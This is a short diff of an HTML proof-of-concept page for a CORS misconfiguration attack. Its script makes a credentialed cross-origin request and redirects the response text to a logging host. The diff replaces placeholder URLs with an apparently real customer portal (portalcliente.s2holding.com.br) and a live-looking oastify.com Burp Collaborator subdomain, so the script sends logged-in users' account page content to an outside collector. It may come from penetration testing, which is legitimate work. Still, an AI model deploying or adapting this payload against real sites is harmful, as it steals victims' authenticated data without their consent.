@@ -10,12 +10,12 @@
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://vuln/accountDetails',true);
+req.open('get','https://portalcliente.s2holding.com.br/Home/Index',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-   location='https://burpcollaborator/log?key='+this.responseText;
+   location='https://u61zkbcdc57w0bkts19piska117tvjj8.oastify.com/log?key='+this.responseText;
 };
 </script>
 </body>
